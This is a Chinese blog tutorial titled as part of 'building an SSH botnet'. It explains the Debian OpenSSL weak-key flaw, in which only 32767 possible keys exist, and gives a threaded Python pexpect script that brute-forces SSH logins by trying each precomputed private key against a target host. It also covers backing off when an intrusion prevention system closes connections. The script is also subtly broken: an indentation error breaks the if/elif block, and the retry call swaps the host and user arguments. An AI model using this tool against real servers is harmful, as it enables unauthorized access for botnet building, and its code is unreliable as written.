# 原创
：  【Python脚本进阶】2.2、构建一个SSH僵尸网络（下）：利用SSH中的弱私钥

# 【Python脚本进阶】2.2、构建一个SSH僵尸网络（下）：利用SSH中的弱私钥

**目录**

[一、简介](#%E4%B8%80%E3%80%81%E7%AE%80%E4%BB%8B)

[1.1、概述：](#1.1%E3%80%81%E6%A6%82%E8%BF%B0%EF%BC%9A)

[1.2、利用：](#1.2%E3%80%81%E5%88%A9%E7%94%A8%EF%BC%9A)

[二、实现](#%E4%BA%8C%E3%80%81%E5%AE%9E%E7%8E%B0)

[2.1、分析：](#2.1%E3%80%81%E5%88%86%E6%9E%90%EF%BC%9A)

[2.2、函数：](#2.2%E3%80%81%E5%87%BD%E6%95%B0%EF%BC%9A)

[2.3、步骤：](#2.3%E3%80%81%E6%AD%A5%E9%AA%A4%EF%BC%9A)

---


## 一、简介

> 
<h3>1.1、概述：</h3>
对于SSH服务器， 密码验证并不是唯一的手段。
SSH还能使用公钥加密的方式进行验证。在使用这一验证方法时， 服务器和用户分别掌握公钥和私钥。使用RSA或是DSA算法， 服务器能生成用于SSH登录的密钥。由于能够生成1024位、2048位， 甚至是4096位密钥， 这个认证过程就很难像利用弱口令进行暴力破解那样被破解掉


> 
<h3>1.2、利用：</h3>
软件自动分析工具发现了一行已被开发人员注释掉的代码。这行被注释掉的代码用来确保创建SSH密钥的信息量足够大。被注释掉之后， 密钥空间的大小的墒值降低到只有15位大小。仅仅15位的墒意味着不论是哪种算法和密钥长度， 可能的密钥一共只有32767个
<hr/>
Rapid的CSO和首席架构师HD Moore在两小时内生成了所有的1024位和2048位算法的可能的密钥。并把结果放到http://digitaloffense.net/tools/debian-openssl/中， 使大家都可以下载利用
<hr/>
可以从下载1024位所有可能的密钥开始， 并解压出这些密钥后， 把其中的公 钥全部删掉， 因为我们测试连接时只用其中的私钥
[Debian OpenSSL Predictable PRNG Toys (hdm.io)<img alt="icon-default.png?t=M666" src="https://csdnimg.cn/release/blog_editor_html/release2.1.7/ckeditor/plugins/CsdnLink/icons/icon-default.png?t=M666"/>https://hdm.io/tools/debian-openssl/](https://hdm.io/tools/debian-openssl/)下面是我使用谷歌翻译后显示出来的结果




---


---


---


## 二、实现

> 
<h3>2.1、分析：</h3>
相当多的服务器上都有漏洞的SSH 服务。能创建一个利用此漏洞的工具，通过访问密钥空间， 可以写一个简短的Python 脚本逐一暴力尝试32767 个可能的钥匙， 以此来登录一个不用密码， 而是使用公钥加密算法进行认证的SSH 服务器。还是要使用暴力破解登录口令时使用的pexpect 库


> 
<h3>2.2、函数：</h3>
spawn: 后面加上需要执行的
<hr/>
expect：工作方式像一个通用化的Chat脚本工具。Chat脚本最早用于UUCP网络内，以用来实现计算机之间需要建立连接时进行特定的登录会话的自动化。
<hr/>
os.listdir：用于返回指定的文件夹包含的文件或文件夹的名字的列表。  它不包括 . 和 .. 即使它在文件夹中。  只支持在 Unix, Windows 下使用
<hr/>
os.path.join：把目录和文件名合成一个路径（os.path 模块主要用于获取文件的属性，有很多方法分类，此乃其一）


---


> 
<h3>2.3、步骤：</h3>
测试弱密钥的脚本与我们暴力破解密码的脚本很相似。
在使用密钥登录SSH 时， 我们需要键入ssh user@host -i keyfile -o PasswordAuthentication =no 格式的一条命令。逐个使用目录中事先生成的密钥， 尝试进行连接。如果连接成功， 我们会把密钥文件的名称打印在屏幕上。还会使用两个全局变量： Stop和Fails 
<hr/>
Fails 的作用是计算由于远程主机关闭连接导致的连接失败的次数。如果这个数字大于5， 终止我们的脚本，扫描触发了远程IPS, 阻止了我们的连接， 那么我们也没有必要再继续下去。Stop 全局变量是一个布尔值， 它能使我们知道是否已经找到一个密钥， 找到的话main(）函数就不用再去启动任何新的连接线程

<pre><code>import pexpect
import optparse
import os


from threading import *
maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Stop = False
Fails = 0
def connect(host, user, keyfile, release):
    global Stop
    global Fails
    try:
        perm_denied = 'Permission denied'
        ssh_newkey = 'Are you sure you want to continue'
        conn_closed = 'Connection closed by remote host'
        opt = ' -o PasswordAuthentication=no'
        connStr = 'ssh ' + user + '@' + host + ' -i ' + keyfile + opt
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TIMEOUT, perm_denied, ssh_newkey, conn_closed, '$', '＃' ])
        if ret == 2:
            print('[-]  Adding Host to ! /.ssh/known_hosts')
        child.sendline('yes')
        connect( user, host, keyfile, False )
        elif ret == 3:
            print( '[-]  Connection Closed By Remote Host' )
            Fails += 1
        elif ret &gt; 3:
            print( '[+]  Success. ' + str(keyfile))
            Stop = True
    finally:
        if release:
            connection_lock.release()


def main():
    parser = optparse.OptionParser( 'usage %prog ' + '-H &lt;target host&gt; -u &lt;user&gt; -d &lt;directory&gt;' )
    parser.add_option( '-H', dest=' tgtHost', type='string', help=' specify target host')
    parser.add_option( '-d', dest =' passDir', type='string', help='specify directory with keys' )
    parser.add_option( '-u', dest='user', type = 'string', help = 'specify the user')
    (options, args) = parser.parse_args()
    host = options.tgtHost
    passDir = options.passDir
    user = options.user
    if host == None or passDir == None or user == None:
        print(parser.usage)
        exit(0)
    for filename in os.listdir( passDir ):
        if Stop:
            print('[*) Exiting: Key Found.')
            exit(0)
        if Fails &gt; 5:
            print( '[!] Exiting: '+' Too Many Connections Closed By Remote Host.')
            print( '[!] Adjust number of simultaneous threads' )
            exit( 0 )
        connection_lock.acquire()
        fullpath = os.path.join( passDir, filename )
        print('[-] Testing keyfile ' + str(fullpath))
        t = Thread( target=connect, args=(user, host, fullpath, True) )
        child = t.start()



if __name__ == '__main__':
    main()</code></pre>

